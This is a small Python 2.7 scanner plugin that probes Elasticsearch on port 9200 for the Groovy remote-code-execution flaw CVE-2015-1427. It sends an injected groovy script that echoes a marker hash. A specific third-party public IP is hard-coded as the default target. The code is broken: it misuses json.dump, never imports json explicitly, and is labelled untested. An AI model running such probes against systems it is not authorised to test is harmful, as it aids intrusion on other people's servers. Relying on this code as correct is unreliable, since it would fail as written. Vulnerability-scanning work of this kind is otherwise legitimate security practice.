#!/usr/bin/python2.7
#coding:utf-8
#__author__ = '1c3z'
#__author__ = 'xfkxfk'
#__author__ = 'yascanner'

import requests
from dummy import * 
import socket, urlparse

info = {
	'NAME':'Elasticsearch Groovy rce CVE-2015-1427',
	'AUTHOR':'yangbh',
	'TIME':'20150315',
	'WEB':'https://www.bugscan.net/#!/n/361,http://zone.wooyun.org/content/18915',
	'DESCRIPTION':'Elasticsearch Groovy任意命令执行漏洞,CVE-2015-1427'
}
opts = [
	['ip','221.123.140.66','target ip'],
	['ports',[9200],'target ip\'s ports']
]

def Assign(services):
	if services.has_key('ip') and services.has_key('ports'):
		if 9200 in services['ports']:
			if services.has_key('port_detail') and services['port_detail'][9200]['name'] != 'http':
				return False
			return True
	return False

def Audit(services):
	ip = services['ip']
	url = "http://"+ip+":9200/_search?pretty"
	data = {"size":1,"script_fields": {"my_field": {"script": "def res=\"3b8096391df29b2ce44a81b9e436f769\";res","lang":"groovy"}}}
	# code, head, res, errcode,finalurl =  curl.curl(" -d " +"'" + data + "' " + url)
	# if res.find('3b8096391df29b2ce44a81b9e436f769') != -1 :
	# 	security_hole('ElasticSearch Groovy remote code exec(CVE-2015-1427)')
	rq = requests.post(url,data=json.dump(data))
	if rq.text and '3b8096391df29b2ce44a81b9e436f769' in rq.text:
		security_hole(url+' '+str(data))

# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__ == '__main__':
	services = {'ip':'221.123.140.66','ports':[9200]}
	pprint(Audit(services))
